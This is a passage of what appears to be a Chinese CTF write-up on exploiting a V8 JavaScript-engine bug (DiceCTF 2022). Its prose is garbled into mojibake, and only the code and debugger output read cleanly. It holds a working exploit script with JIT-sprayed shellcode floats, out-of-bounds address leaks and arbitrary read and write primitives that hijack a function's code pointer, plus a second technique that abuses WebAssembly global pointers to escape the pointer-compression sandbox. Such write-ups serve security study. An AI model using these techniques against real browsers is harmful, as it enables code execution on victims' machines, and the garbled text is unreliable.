<p>æ ¹æ®å‰é¢çš„é€»è¾‘ï¼Œæˆ‘ä»¬ä½¿ rcx+0x1b ä¸º 0ï¼Œrcx &#x3D; rcx + 0x3fï¼Œé‚£ä¹ˆæ­¤æ—¶çš„ code å°±åº”ä¼ªé€ ä¸º (0x2013000440bc-0x3f-0x201300044001) + 0x201300044001 &#x3D; 0x201300044001 + 0x7cï¼Œé‚£ä¹ˆæ­¤æ—¶ rcx åº”ä¸º0x201300044001 + 0x7cï¼Œ[rcx + 0x1b] ä¸ 0x2000000 ä¸º0ï¼š</p>
<p><img src="/img/Dicectf2022-memoryhole/1-15.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0xff418944000002b8</span> &amp; <span class="number">0x20000000</span> = <span class="number">0L</span></span><br></pre></td></tr></table></figure>

<p>æ­¤å¤„é€‰æ‹©å°† f å‡½æ•°çš„ code è¦†å†™ä¸º func1 å¸ƒç½®å¥½çš„ jit ä»£ç æ®µï¼Œä¹Ÿå°±æ˜¯ jitAddr + 0x7cï¼Œè¿™æ ·æ‰§è¡Œ f() å°±ä¼šå»æ‰§è¡Œjitäº†ã€‚</p>
<p><img src="/img/Dicectf2022-memoryhole/1res.png"></p>
<h2 id="exp1-js"><a href="#exp1-js" class="headerlink" title="exp1.js"></a>exp1.js</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> __buf8 = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">const</span> __dvCvt = <span class="keyword">new</span> <span class="title class_">DataView</span>(__buf8);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    __dvCvt.<span class="title function_">setFloat64</span>(<span class="number">0</span>, val, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> __dvCvt.<span class="title function_">getUint32</span>(<span class="number">0</span>, <span class="literal">true</span>) + __dvCvt.<span class="title function_">getUint32</span>(<span class="number">4</span>, <span class="literal">true</span>) * <span class="number">0x100000000</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Uint64 =&gt; double</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> tmp0 = val &amp; <span class="number">0x100000000</span>;</span><br><span class="line">    __dvCvt.<span class="title function_">setUint32</span>(<span class="number">0</span>, tmp0, <span class="literal">true</span>);</span><br><span class="line">    __dvCvt.<span class="title function_">setUint32</span>(<span class="number">4</span>, (val - tmp0) / <span class="number">0x100000000</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> __dvCvt.<span class="title function_">getFloat64</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d22u</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    __dvCvt.<span class="title function_">setFloat64</span>(<span class="number">0</span>, val, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">hex</span> = (<span class="params">x</span>) =&gt; (<span class="string">&quot;0x&quot;</span> + x.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">fun</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> [<span class="number">1.0</span>, </span><br><span class="line">            <span class="number">1.95538254221075331056310651818E-246</span>,</span><br><span class="line">            <span class="number">1.95606125582421466942709801013E-246</span>,</span><br><span class="line">            <span class="number">1.99957147195425773436923756715E-246</span>,</span><br><span class="line">            <span class="number">1.95337673326740932133292175341E-246</span>,</span><br><span class="line">            <span class="number">2.63486047652296056448306022844E-284</span>,</span><br><span class="line">            ];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">%<span class="title class_">PrepareFunctionForOptimization</span>(fun);</span><br><span class="line"><span class="title function_">fun</span>();</span><br><span class="line">%<span class="title class_">OptimizeFunctionOnNextCall</span>(fun);</span><br><span class="line"><span class="title function_">fun</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">f</span> = (<span class="params"></span>) =&gt; <span class="number">123</span>;</span><br><span class="line"><span class="keyword">let</span> arr = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">const</span> o = &#123;<span class="attr">x</span>:<span class="number">1337</span>, <span class="attr">a</span>:f, <span class="attr">b</span>:fun&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> ua = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(<span class="number">2</span>);</span><br><span class="line">arr.<span class="title function_">setLength</span>(<span class="number">100</span>);</span><br><span class="line"><span class="title function_">d22u</span>(arr[<span class="number">5</span>]);</span><br><span class="line"><span class="keyword">const</span> funAddr = __dvCvt.<span class="title function_">getUint32</span>(<span class="number">4</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="keyword">const</span> fAddr = __dvCvt.<span class="title function_">getUint32</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[+] fun addr low = <span class="subst">$&#123;hex(funAddr)&#125;</span>`</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[+] f addr low = <span class="subst">$&#123;hex(fAddr)&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line">ua[<span class="number">0</span>] = <span class="number">0xdeedbeef</span>;</span><br><span class="line"><span class="keyword">var</span> base_ptr = -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">10</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">d22u</span>(arr[i]);</span><br><span class="line">    <span class="keyword">const</span> high = __dvCvt.<span class="title function_">getUint32</span>(<span class="number">4</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">const</span> low = __dvCvt.<span class="title function_">getUint32</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (high == <span class="number">0xdeedbeef</span> || low == <span class="number">0xdeedbeef</span>) &#123;</span><br><span class="line">        base_ptr = i + <span class="number">7</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (base_ptr == -<span class="number">1</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[-] search base_ptr ptr failed!&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] base_ptr offset: &quot;</span> + base_ptr);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[+] base_ptr (*0x100000000) = <span class="subst">$&#123;hex(d2u(arr[base_ptr]))&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbRead</span>(<span class="params">off</span>) &#123;</span><br><span class="line">    arr[base_ptr] = <span class="title function_">u2d</span>((off-<span class="number">7</span>) * <span class="number">0x100000000</span>);</span><br><span class="line">    <span class="keyword">return</span> ua[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbWrite</span>(<span class="params">off, val</span>) &#123;</span><br><span class="line">    arr[base_ptr] = <span class="title function_">u2d</span>((off-<span class="number">7</span>) * <span class="number">0x100000000</span>);</span><br><span class="line">    ua[<span class="number">0</span>] = val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">jitAddr = <span class="title function_">arbRead</span>(funAddr + <span class="number">0x17</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[+] jitAddr = <span class="subst">$&#123;hex(jitAddr)&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">arbWrite</span>(fAddr + <span class="number">0x17</span>, jitAddr + <span class="number">0x7c</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">f</span>();</span><br><span class="line"><span class="comment">// %DebugPrint(f);</span></span><br><span class="line"><span class="comment">// %SystemBreak();</span></span><br></pre></td></tr></table></figure>

<h2 id="æ–¹å¼äºŒï¼šåˆ©ç”¨-wasmInstance-ä¸­çš„å…¨å±€å˜é‡æŒ‡é’ˆ"><a href="#æ–¹å¼äºŒï¼šåˆ©ç”¨-wasmInstance-ä¸­çš„å…¨å±€å˜é‡æŒ‡é’ˆ" class="headerlink" title="æ–¹å¼äºŒï¼šåˆ©ç”¨ wasmInstance ä¸­çš„å…¨å±€å˜é‡æŒ‡é’ˆ"></a>æ–¹å¼äºŒï¼šåˆ©ç”¨ wasmInstance ä¸­çš„å…¨å±€å˜é‡æŒ‡é’ˆ</h2><p>æƒ³è¦çªç ´é™åˆ¶å®ç°ä»»æ„åœ°å€å†™ï¼Œå°±è¦<strong>æ‰¾ä¸€äº›å¯ç”¨ã€å¯æ§çš„ 64 ä½æœªè¢«å‹ç¼©çš„æŒ‡é’ˆ</strong>ã€‚ä½¿ç”¨ <code>%DebugPrint</code> æ‰“å° WasmInstanceï¼š</p>
<p><img src="/img/Dicectf2022-memoryhole/2-12.png"></p>
<p>å…¶ä¸­çš„ <code>imported_function_targets</code> å’Œ <code>imported_mutable_globals</code> éƒ½æŒ‡å‘äº†å®Œæ•´çš„64 bit çš„å †æŒ‡é’ˆã€‚</p>
<p>åœ¨ v8 æºç ä¸­æœç´¢ï¼Œå¯ä»¥çœ‹åˆ°ä¸€äº›æœ‰ç”¨çš„ä¿¡æ¯ï¼š</p>
<p><img src="/img/Dicectf2022-memoryhole/2-13.png"></p>
<p><img src="/img/Dicectf2022-memoryhole/2-14.png"></p>
<p>å†ç»“åˆå…¶ä»–æ³¨é‡Šï¼Œå¤§æ¦‚äº†è§£åˆ°è¿™æ˜¯ä¸€ä¸ªå­˜æ”¾ wasm å…¨å±€å˜é‡çš„ä¸œè¥¿ï¼Œä¸”é€šè¿‡æºç ä¸­çš„å†™æ³•ï¼Œ<code>imported_function_targets</code> æŒ‡å‘çš„åº”è¯¥æ˜¯ä¸ªæ•°ç»„ï¼Œæ•°ç»„çš„æ¯ä¸ªç´¢å¼•æŒ‡å‘äº†å…¨å±€å˜é‡çš„ addressã€‚é‚£è¿™æ—¶å€™å°±å¯ä»¥ç»™æˆ‘ä»¬å¸¸ç”¨çš„ wasm ä»£ç åŠ ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œæ‰¾åˆ° wasm global çš„å†™æ³• <a href="https://developer.mozilla.org/en-US/docs/WebAssembly/JavaScript_interface/Global/Global">WebAssembly.Global() constructor - WebAssembly | MDN (mozilla.org)</a>ã€‚äº†è§£åˆ°äº† WebAssembly Global çš„æ„é€ æ–¹æ³•ä»¥åï¼Œå¯ä»¥å°è¯•ç»™ Wasm Instance åŠ ä¸€ä¸ªå…¨å±€å˜é‡ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="variable language_">global</span> = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Global</span>(&#123;<span class="attr">value</span>:<span class="string">&#x27;i64&#x27;</span>, <span class="attr">mutable</span>:<span class="literal">true</span>&#125;, <span class="number">1234n</span>);<span class="comment">// æ³¨æ„i64å³BigInt</span></span><br><span class="line"><span class="keyword">let</span> wasmCode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,</span><br><span class="line">    <span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,</span><br><span class="line">    <span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">102</span>,<span class="number">117</span>,<span class="number">110</span>,<span class="number">99</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">136</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">1</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> wasmInstance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(<span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode),&#123; <span class="attr">js</span>: &#123;<span class="variable language_">global</span>&#125; &#125;);</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">WasmJSFunction</span> = wasmInstance.<span class="property">exports</span>.<span class="property">func</span>;</span><br><span class="line"></span><br><span class="line">%<span class="title class_">DebugPrint</span>(wasmInstance);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(<span class="variable language_">global</span>);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure>

<p><img src="/img/Dicectf2022-memoryhole/2-1.png"></p>
<p>ç»“åˆ<a href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/wasm/wasm-objects.h;l=289">æºç  wasm-objects.h - Chromium Code Search</a>çœ‹åˆ°<code>untagged_buffer</code>ä¹Ÿæ˜¯ä¸€ç§<code>ArrayBuffer</code>ï¼Œè¡¨ç¤º Wasm å…¨å±€å˜é‡æ‰€ç”¨ï¼š</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Representation of a WebAssembly.Global JavaScript-level object.</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WasmGlobalObject</span></span><br><span class="line">    : <span class="keyword">public</span> TorqueGeneratedWasmGlobalObject&lt;WasmGlobalObject, JSObject&gt; &#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="built_in">DECL_ACCESSORS</span>(untagged_buffer, JSArrayBuffer)</span><br><span class="line">  <span class="built_in">DECL_ACCESSORS</span>(tagged_buffer, FixedArray)</span><br><span class="line">  <span class="built_in">DECL_PRIMITIVE_ACCESSORS</span>(type, wasm::ValueType)</span><br><span class="line">  Â·Â·Â·</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/img/Dicectf2022-memoryhole/2-2.png"></p>
<p>å¯ä»¥çœ‹åˆ°å…¨å±€å˜é‡çš„å€¼å­˜åˆ°äº†<code>backing_store</code>æŒ‡å‘çš„å†…å­˜ã€‚ä½†æ˜¯å›å¤´çœ‹ Instance å‘ç° <code>imported_mutable_globals</code>è¿˜æ˜¯æœªæŒ‡å‘æ·»åŠ çš„å…¨å±€å˜é‡ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">job 0xc83081d2a09</span></span><br><span class="line">0xc83081d2a09: [WasmInstanceObject] in OldSpace</span><br><span class="line"> - map: 0x0c8308206439 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> Â·Â·Â·</span><br><span class="line"> - imported_function_targets: 0x55b868265a80</span><br><span class="line"> - globals_start: (nil)</span><br><span class="line"> - imported_mutable_globals: 0x55b868265aa0</span><br><span class="line"> Â·Â·Â·</span><br></pre></td></tr></table></figure>

<p><img src="/img/Dicectf2022-memoryhole/2-3.png"></p>
<p>åŸå› æ˜¯è¿™æ®µ Wasm code ä¸­å¹¶æœªä½¿ç”¨è¿™ä¸ªå…¨å±€å˜é‡ã€‚é‚£æ¥ä¸‹æ¥å°±æ˜¯å»æ‰¾ä¸€ä¸‹å¦‚ä½•å†™ Wasm code å¹¶ä¸”ä½¿ç”¨å…¨å±€å˜é‡ã€‚</p>
<p>åœ¨ <a href="https://github.com/mdn/webassembly-examples/tree/master/js-api-examples">webassembly-examples&#x2F;js-api-examples at master Â· mdn&#x2F;</a> ä¸­æ‰¾åˆ° global.watï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(module</span><br><span class="line">  (global $g (import <span class="string">&quot;js&quot;</span> <span class="string">&quot;global&quot;</span>) (mut i32))</span><br><span class="line">  (func (export <span class="string">&quot;getGlobal&quot;</span>) (result i32)</span><br><span class="line">    (global.get $g)</span><br><span class="line">  )</span><br><span class="line">  (func (export <span class="string">&quot;incGlobal&quot;</span>)</span><br><span class="line">    (global.<span class="built_in">set</span> $g (i32.add (global.get $g) (i32.<span class="type">const</span> <span class="number">1</span>)))</span><br><span class="line">  )</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>ï¼ˆçœ‹ç€è¿™è¯­æ³•æ€»æœ‰ä¸€ç§è¯´ä¸å‡ºæ¥çš„æ„Ÿè§‰ï¼‰</p>
<p>è¿™é‡Œå°±ç›´æ¥ç”¨ <a href="https://blog.kylebot.net/2022/02/06/DiceCTF-2022-memory-hole/">kylebotâ€™s Blog</a> ä¸­çš„ watï¼Œä½¿ç”¨ <a href="https://github.com/WebAssembly/wabt">WebAssembly&#x2F;wabt</a> ç¼–è¯‘ wat å¾—åˆ° wasmcodeã€‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// test.wat</span></span><br><span class="line">(module</span><br><span class="line">  (global $g (import <span class="string">&quot;js&quot;</span> <span class="string">&quot;global&quot;</span>) (mut i64))</span><br><span class="line">  (func (export <span class="string">&quot;getGlobal&quot;</span>) (result i64)</span><br><span class="line">    (global.get $g)</span><br><span class="line">  )</span><br><span class="line">  (func (export <span class="string">&quot;incGlobal&quot;</span>)</span><br><span class="line">    (global.<span class="built_in">set</span> $g (i64.add (global.get $g) (i64.<span class="type">const</span> <span class="number">1</span>)))</span><br><span class="line">  )</span><br><span class="line">  (func (export <span class="string">&quot;setGlobal&quot;</span>) (param $a i64)</span><br><span class="line">    (global.<span class="built_in">set</span> $g (local.get $a))</span><br><span class="line">  )</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">$ bin/wat2wasm ./test.wat</span><br></pre></td></tr></table></figure>

<p>å³å¾—åˆ° test.wasmï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0061 736d 0100 0000 010c 0360 0001 7e60</span><br><span class="line">0000 6001 7e00 020e 0102 6a73 0667 6c6f</span><br><span class="line">6261 6c03 7e01 0304 0300 0102 0725 0309</span><br><span class="line">6765 7447 6c6f 6261 6c00 0009 696e 6347</span><br><span class="line">6c6f 6261 6c00 0109 7365 7447 6c6f 6261</span><br><span class="line">6c00 020a 1703 0400 2300 0b09 0023 0042</span><br><span class="line">017c 2400 0b06 0020 0024 000b</span><br></pre></td></tr></table></figure>

<p>ç¨ä½œå¤„ç†ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var global = new WebAssembly.Global(&#123;value:&#x27;i64&#x27;, mutable:true&#125;, 256n);</span><br><span class="line">let wasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 12, 3, 96, 0, 1, 126, 96, 0, 0, 96, 1, 126, 0, 2, 14, 1, 2, 106, 115, 6, 103, 108, 111, 98, 97, 108, 3, 126, 1, 3, 4, 3, 0, 1, 2, 7, 37, 3, 9, 103, 101, 116, 71, 108, 111, 98, 97, 108, 0, 0, 9, 105, 110, 99, 71, 108, 111, 98, 97, 108, 0, 1, 9, 115, 101, 116, 71, 108, 111, 98, 97, 108, 0, 2, 10, 23, 3, 4, 0, 35, 0, 11, 9, 0, 35, 0, 66, 1, 124, 36, 0, 11, 6, 0, 32, 0, 36, 0, 11]);</span><br><span class="line"></span><br><span class="line">let wasmInstance = new WebAssembly.Instance(new WebAssembly.Module(wasmCode),&#123; js: &#123;global&#125; &#125;);</span><br><span class="line">var WasmJSFunction = wasmInstance.exports.incGlobal;</span><br><span class="line"></span><br><span class="line">WasmJSFunction();</span><br><span class="line">%DebugPrint(wasmInstance);</span><br><span class="line">%DebugPrint(global);</span><br><span class="line">%SystemBreak();</span><br><span class="line">WasmJSFunction();</span><br></pre></td></tr></table></figure>

<p>è°ƒè¯•çœ‹åˆ° <code>imported_mutable_globals</code>æŒ‡å‘äº†å­˜å‚¨ global çš„å†…å­˜ï¼Œå¹¶ä¸”ç”±äºåœ¨ <code>%DebugPrint</code> ä¹‹å‰å°±è°ƒç”¨äº†ä¸€æ¬¡ incï¼Œæ­¤æ—¶çš„å€¼ä¸º 0x101ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">DebugPrint: 0x3771081d2a51: [WasmInstanceObject] in OldSpace</span><br><span class="line"> Â·Â·Â·</span><br><span class="line"> - imported_function_targets: 0x55fb88e4e980</span><br><span class="line"> - globals_start: (nil)</span><br><span class="line"> - imported_mutable_globals: 0x55fb88e4e9a0</span><br><span class="line"> </span><br><span class="line">DebugPrint: 0x377108048839: [WasmGlobalObject]</span><br><span class="line"> - map: 0x377108206821 &lt;Map(HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - untagged_buffer: 0x37710804885d &lt;ArrayBuffer map = 0x377108203289&gt;</span><br><span class="line"> - offset: 0</span><br><span class="line"> - raw_type: 2</span><br><span class="line"> - is_mutable: 1</span><br><span class="line"> - type: i64</span><br><span class="line"> - is_mutable: 1</span><br></pre></td></tr></table></figure>

<p><img src="/img/Dicectf2022-memoryhole/2-4.png"></p>
<p>æ­¤æ—¶æˆ‘ä»¬æ‰‹åŠ¨ä¿®æ”¹ WasmInstance ä¸­çš„ <code>imported_mutable_globals</code> å­—æ®µçš„å€¼ï¼Œå†ç»§ç»­è¿è¡Œè°ƒç”¨ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set &#123;long&#125;0x3771081d2aa0=0x4141414141414141</span><br></pre></td></tr></table></figure>

<p><img src="/img/Dicectf2022-memoryhole/2-5.png"></p>
<p><img src="/img/Dicectf2022-memoryhole/2-6.png"></p>
<p>å‘ç° crash åˆ°äº†è¿™é‡Œï¼Œç»“åˆä¸‹é¢çš„ä¸¤è¡Œæ±‡ç¼–å’Œå‰é¢çš„è°ƒè¯•ï¼Œå¯ä»¥å¾—å‡º V8 å°†è¿™ä¸ªå€¼ä½œä¸ºä¸€ä¸ªæŒ‡é’ˆçš„æŒ‡é’ˆï¼Œè§£ä¸¤å±‚å¼•ç”¨åå–å‡ºçœŸæ­£çš„ global çš„å€¼ï¼ˆè¯å®ä¸€å¼€å§‹çœ‹æºç çš„çŒœæµ‹ï¼‰ã€‚<strong>æœ€é‡è¦çš„æ˜¯è¿™ä¸ªè¿‡ç¨‹çš„åœ°å€éƒ½æ˜¯ 64 ä½çš„ï¼Œç›¸å½“äºæ²¡æœ‰äº†æ²™ç®±ã€‚æ‰€ä»¥æ¥ä¸‹æ¥å°±æ˜¯åˆ©ç”¨ oob ç¯¡æ”¹ <code>imported_mutable_globals</code> çš„å€¼ï¼Œé€šè¿‡è¿™ä¸ªç±»ä¼¼ä»¥å‰ç»å¸¸ä½¿ç”¨çš„ backing_store æŒ‡é’ˆä¸€æ ·å®Œæˆä»»æ„è¯»å†™ã€‚æœ‰ä¸¤ä¸ªåŒºåˆ«å°±æ˜¯ä¸€ï¼šè¯¥å­—æ®µå¹¶ä¸æ˜¯å¯¹è±¡ï¼Œä¼ªé€ èµ·æ¥å¾ˆå®¹æ˜“ï¼ŒäºŒå°±æ˜¯ä¸¤å±‚å¼•ç”¨æ‰æ˜¯çœŸæ­£ä»»æ„å†™çš„åœ°å€ã€‚</strong>æ‰€ä»¥ç»¼ä¸Šå¯ä»¥ fake ä¸€ä¸ªæ•°ç»„ï¼Œæ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯å¯è¯»å¯å†™çš„åœ°å€ï¼ˆå……å½“ <code>backing_store</code> çš„è§’è‰² ï¼‰ã€‚ç”±äºæ•°ç»„çš„åœ°å€è¿˜æ˜¯ç”±åŸºå€ + åç§»ç»„æˆï¼Œåç§»å¯ä»¥æ¯”è¾ƒå¥½æ³„éœ²ã€‚é‡ç‚¹æ˜¯æ³„éœ² js åŸºå€ã€‚</p>
<blockquote>
<p>æ³¨æ„ js çš„ä½è¿ç®—ç¬¦åœ¨è¿ç®—æ—¶æ“ä½œæ•°è¢«è½¬æ¢ä¸º 32bit æ•´æ•¸ï¼Œä»¥ä½åºåˆ—ï¼ˆ0 å’Œ 1 ç»„æˆï¼‰è¡¨ç¤ºã€‚è‹¥è¶…é 32bitsï¼Œå‰‡å–ä½ä½ 32bitï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Before: <span class="number">11100110111110100000000000000110000000000001</span></span><br><span class="line">After:              <span class="number">10100000000000000110000000000001</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>æˆ‘è¿™é‡Œç›´æ¥ä¿®æ”¹äº† base ä¸º 1ï¼Œä¸ externel ç›¸åŠ æ­£å¥½ä¸º 8ï¼Œä» js_base + 8 å¤„å¼€å§‹æ³„éœ²ï¼Œè¿™é™„è¿‘æœ‰å¾ˆå¤š js_base ç›¸å…³çš„åœ°å€ï¼Œéšä¾¿é€‰ä¸€ä¸ªå°±å¥½ã€‚</p>
<p><img src="/img/Dicectf2022-memoryhole/2-15.png"></p>
<p><img src="/img/Dicectf2022-memoryhole/2-16.png"></p>
<blockquote>
<p>å¼€è¾Ÿçš„ Uint32Array çš„é•¿åº¦ä¼šå½±å“å…¶åœ°å€æ˜¯ 4 çš„å€æ•°è¿˜æ˜¯ä» 8 çš„å€æ•°ï¼Œæ‰€ä»¥å¥‡æ•°è¾¾ä¸åˆ°ç›®çš„å°±å°è¯•å¶æ•°</p>
<p>var leak_arr &#x3D; new Uint32Array(0xe);</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Uint32Array</span>_len = <span class="number">0xc</span>;</span><br><span class="line"><span class="keyword">var</span> leak_arr = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(<span class="title class_">Uint32Array</span>_len);</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ ¹æ® length å­—æ®µæ‰¾åˆ° btyelengthã€base_pointer å­—æ®µç›¸å¯¹äº oob æ•°ç»„çš„ index</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">d22u</span>(vuln_arr[i]);</span><br><span class="line">    <span class="keyword">const</span> high = __dvCvt.<span class="title function_">getUint32</span>(<span class="number">4</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">const</span> low = __dvCvt.<span class="title function_">getUint32</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (high == <span class="title class_">Uint32Array</span>_len || low == <span class="title class_">Uint32Array</span>_len) &#123;</span><br><span class="line">        <span class="title class_">Uint32Array</span>_len_idx = i;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] Uint32Array_len_idx =&gt; &quot;</span> + <span class="title function_">hex</span>(<span class="title class_">Uint32Array</span>_len_idx));</span><br><span class="line"><span class="comment">// base pointer in high word</span></span><br><span class="line"><span class="keyword">var</span> base_pointer_idx = <span class="title class_">Uint32Array</span>_len_idx + <span class="number">2</span>;</span><br><span class="line"><span class="keyword">var</span> byte_length_idx = <span class="title class_">Uint32Array</span>_len_idx - <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>é‡åˆ°ä¸€äº›ç„å­¦é—®é¢˜ï¼Œè·‘ä¸¤æ¬¡ gc å°è¯•ä¸€ä¸‹ï¼Œå°¤å…¶æ˜¯å†…å­˜ä¸å¯¹é½ã€‚</p>
</blockquote>
<p>ä¿®æ”¹å®Œå¯¹åº”å­—æ®µçš„æ•°æ®ï¼Œå³å¯æ³„éœ² js_baseã€‚</p>
